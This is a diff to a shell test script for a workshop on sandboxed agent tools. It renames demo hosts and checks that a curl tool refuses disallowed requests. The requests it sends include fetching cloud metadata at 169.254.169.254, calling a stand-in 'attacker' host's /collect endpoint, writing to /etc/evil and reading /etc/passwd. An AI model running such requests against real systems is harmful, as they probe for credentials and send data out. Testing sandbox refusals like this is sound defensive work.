@@ -45,9 +45,8 @@ else
   OUT() { echo "$1/expected-output.txt"; }
   CHECKS() { echo "$1/control-checks.txt"; }
 fi
-# A fact checked after the replay (verify mode), such as a counter's value.
+# A fact checked after the replay (verify mode), such as a sign-in reply.
 fact() { echo "$1=$2" >>"$FACTS"; }
-leaks() { curl -s -m 10 -H 'Host: sites.localhost' "$URL/count" | sed -n 's/^leaks=//p'; }
 # What the READMEs tell attendees to type. prove itself waits more precisely
 # (rollout below), so a slow machine can't record a reply from the old version.
 WAIT='sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent'
@@ -134,13 +133,12 @@ apply() { # manifest with one WorkloadDeployment: apply it and wait for the new 
   echo
 }
 
-# Clean slate: one host pod, no agent workloads, the toy sites running.
+# Clean slate: one host pod, no agent workloads, the demo websites running.
 kubectl -n wasmcloud scale deployment hostgroup-default --replicas=1 >/dev/null
 kubectl -n wasmcloud rollout status deployment/hostgroup-default --timeout=180s >/dev/null
 kubectl delete workloaddeployment --all -n default >/dev/null 2>&1 || true
-"$ROOT/scripts/stores.sh" reset >/dev/null
-kubectl apply -f steps/00-fixtures/toy-sites.yaml >/dev/null
-kubectl wait --for=condition=Ready workloaddeployment/toy-sites -n workshop-sites --timeout=120s >/dev/null
+kubectl apply -f steps/00-demo-sites/demo-sites.yaml >/dev/null
+kubectl wait --for=condition=Ready workloaddeployment/demo-sites -n demo-sites --timeout=120s >/dev/null
 
 {
   echo "# Step 1: the agent with no tools; every tool slot holds the placeholder"
@@ -148,9 +146,9 @@ kubectl wait --for=condition=Ready workloaddeployment/toy-sites -n workshop-site
   echo "# No instruction in the prompt: the model answers in text"
   ask agent.localhost 'hello'
   echo "# The model asks for curl; the slot holds the placeholder, which says so"
-  ask agent.localhost 'fetch http://api.workshop-sites.svc/data'
+  ask agent.localhost 'fetch http://api.demo-sites.svc/data'
   echo "# Two instructions: the model follows both, and doesn't retry an error"
-  ask agent.localhost 'fetch http://api.workshop-sites.svc/data. Then sqlite .tables'
+  ask agent.localhost 'fetch http://api.demo-sites.svc/data. Then sqlite .tables'
   echo "# The agent harness's imports from this workshop: the model, three typed, labelled tool slots and GitHub sign-in"
   echo "\$ wasm-tools component wit artifacts/agent.wasm | grep 'import .*workshop:toolbox'"
   wasm-tools component wit artifacts/agent.wasm | grep 'import .*workshop:toolbox'
@@ -170,23 +168,21 @@ kubectl wait --for=condition=Ready workloaddeployment/toy-sites -n workshop-site
   wasm-tools component wit artifacts/tool_curl.wasm | grep -E 'import wasi:(http|sockets|filesystem)'
   apply steps/02-curl/workload.yaml
   echo "# Granted: the api host answers"
-  ask agent.localhost 'fetch http://api.workshop-sites.svc/data'
+  ask agent.localhost 'fetch http://api.demo-sites.svc/data'
   echo "# Writing inside the tool's folder with -o: allowed"
-  ask agent.localhost 'save http://api.workshop-sites.svc/data to page.html'
-  fact collector-before-escapes "$(leaks)"
+  ask agent.localhost 'save http://api.demo-sites.svc/data to page.html'
   echo "# The cloud metadata service: refused, it is not granted"
   ask agent.localhost 'curl -s http://169.254.169.254/latest/meta-data/'
   echo "# Another cluster host: refused"
-  ask agent.localhost 'curl -s http://collector.workshop-sites.svc/collect'
+  ask agent.localhost 'curl -s http://attacker.demo-sites.svc/collect'
   echo "# A redirect from the granted host to a denied host: the second hop is refused"
-  ask agent.localhost 'curl -sL http://api.workshop-sites.svc/redirect'
+  ask agent.localhost 'curl -sL http://api.demo-sites.svc/redirect'
   echo "# Writing outside the tool's folder with -o: refused"
-  ask agent.localhost 'curl -o /etc/evil -s http://api.workshop-sites.svc/data'
+  ask agent.localhost 'curl -o /etc/evil -s http://api.demo-sites.svc/data'
   echo "# Reading a file:// URL outside the tool's folder: refused"
   ask agent.localhost 'curl -s file:///etc/passwd'
   echo "# Reading a file:// URL inside the tool's folder: allowed"
   ask agent.localhost 'curl -s file:///data/page.html'
-  fact collector-after-escapes "$(leaks)"
 } >"$(OUT steps/02-curl)" 2>&1
 
 {
@@ -194,11 +190,10 @@ kubectl wait --for=condition=Ready workloaddeployment/toy-sites -n workshop-site
   echo "# Control: curl's allowedHosts widened to \"*\", nothing else changed."
   apply steps/02-curl/control-wide-open.yaml
   echo "# The same fetch that was refused now reaches the other host:"
-  ask agent.localhost 'curl -s http://collector.workshop-sites.svc/collect'
-  fact collector-after-control "$(leaks)"
+  ask agent.localhost 'curl -s http://attacker.demo-sites.svc/collect'
   apply steps/02-curl/workload.yaml
   echo "# Reverted: refused again"
-  ask agent.localhost 'curl -s http://collector.workshop-sites.svc/collect'
+  ask agent.localhost 'curl -s http://attacker.demo-sites.svc/collect'
 } >"$(CHECKS steps/02-curl)" 2>&1
 
 {
@@ -326,21 +321,15 @@ absent() { # file, text, why
   CHECKED=$((CHECKED + 1))
   if grep -qF -- "$2" "$1"; then fail "$1" "$3" "does not contain: $2" "$(grep -F -m1 -- "$2" "$1")"; fi
 }
-want_fact() { # name, value, why
-  local got
-  CHECKED=$((CHECKED + 1))
-  got=$(sed -n "s/^$1=//p" "$FACTS" | tail -1)
-  [ "$got" = "$2" ] || fail facts "$3" "$1=$2" "$1=${got:-<unset>}"
-}
 DENIED_HOST='this tool may not reach that host (not in its allowedHosts)'
 NO_FILE='No such file or directory'
 
 f=$(OUT steps/01-agent)
 calls "$f" 'hello' 0
-expect "$f" 'fetch http://api.workshop-sites.svc/data' other "the curl tool isn't installed yet"
-calls "$f" 'fetch http://api.workshop-sites.svc/data' 1
-expect "$f" 'fetch http://api.workshop-sites.svc/data. Then sqlite .tables' other "the curl tool isn't installed yet"
-calls "$f" 'fetch http://api.workshop-sites.svc/data. Then sqlite .tables' 2
+expect "$f" 'fetch http://api.demo-sites.svc/data' other "the curl tool isn't installed yet"
+calls "$f" 'fetch http://api.demo-sites.svc/data' 1
+expect "$f" 'fetch http://api.demo-sites.svc/data. Then sqlite .tables' other "the curl tool isn't installed yet"
+calls "$f" 'fetch http://api.demo-sites.svc/data. Then sqlite .tables' 2
 present "$f" "[tool sqlite] error: {\"other\":\"the sqlite tool isn't installed yet\"}" 'the second instruction reaches the sqlite placeholder'
 absent "$f" '[agent] stopped after' 'the model never loops'
 present "$f" 'import sqlite: workshop:toolbox/sqlite@0.4.0' 'the harness imports the sqlite slot'
@@ -354,25 +343,22 @@ absent "$f" 'import wasi:http/client' 'the harness imports no HTTP client'
 f=$(OUT steps/02-curl)
 present "$f" 'import wasi:http/client@0.3.0' 'curl imports an HTTP client'
 absent "$f" 'import wasi:sockets' 'curl imports no sockets'
-expect "$f" 'fetch http://api.workshop-sites.svc/data' ok '"service":"releases"'
-expect "$f" 'save http://api.workshop-sites.svc/data to page.html' ok 'saved 95 bytes to /data/page.html'
+expect "$f" 'fetch http://api.demo-sites.svc/data' ok '"service":"releases"'
+expect "$f" 'save http://api.demo-sites.svc/data to page.html' ok 'saved 95 bytes to /data/page.html'
 expect "$f" 'curl -s http://169.254.169.254/latest/meta-data/' access-denied "169.254.169.254: $DENIED_HOST"
-expect "$f" 'curl -s http://collector.workshop-sites.svc/collect' access-denied "collector.workshop-sites.svc: $DENIED_HOST"
-expect "$f" 'curl -sL http://api.workshop-sites.svc/redirect' access-denied "collector.workshop-sites.svc: $DENIED_HOST"
-expect "$f" 'curl -o /etc/evil -s http://api.workshop-sites.svc/data' access-denied "/etc/evil: $NO_FILE"
+expect "$f" 'curl -s http://attacker.demo-sites.svc/collect' access-denied "attacker.demo-sites.svc: $DENIED_HOST"
+expect "$f" 'curl -sL http://api.demo-sites.svc/redirect' access-denied "attacker.demo-sites.svc: $DENIED_HOST"
+expect "$f" 'curl -o /etc/evil -s http://api.demo-sites.svc/data' access-denied "/etc/evil: $NO_FILE"
 expect "$f" 'curl -s file:///etc/passwd' access-denied "/etc/passwd: $NO_FILE"
 expect "$f" 'curl -s file:///data/page.html' ok '"service":"releases"'
-want_fact collector-after-escapes "$(sed -n 's/^collector-before-escapes=//p' "$FACTS")" 'no refused request reached the collector'
 f=$(CHECKS steps/02-curl)
-expect "$f" 'curl -s http://collector.workshop-sites.svc/collect' ok 'collector: thanks, that is leak #'
+expect "$f" 'curl -s http://attacker.demo-sites.svc/collect' ok 'attacker: got your request'
 last=$(awk '/Reverted: refused again/ { on = 1 } on && /^\[tool curl\]/ { print; exit }' "$f")
 CHECKED=$((CHECKED + 1))
 case "$last" in
-  *"error: {\"access-denied\":\"collector.workshop-sites.svc: $DENIED_HOST"*) ;;
-  *) fail "$f" 'the collector after the grant is reverted' "access-denied: collector.workshop-sites.svc: $DENIED_HOST" "${last:-<no tool call>}" ;;
+  *"error: {\"access-denied\":\"attacker.demo-sites.svc: $DENIED_HOST"*) ;;
+  *) fail "$f" "the attacker's server after the grant is reverted" "access-denied: attacker.demo-sites.svc: $DENIED_HOST" "${last:-<no tool call>}" ;;
 esac
-grant=$(sed -n 's/^collector-after-escapes=//p' "$FACTS")
-want_fact collector-after-control "$((${grant:-0} + 1))" 'the control request reached the collector once'
 
 f=$(OUT steps/03-sqlite)
 present "$f" 'payroll.db' 'the host pod holds a database no workload is granted'
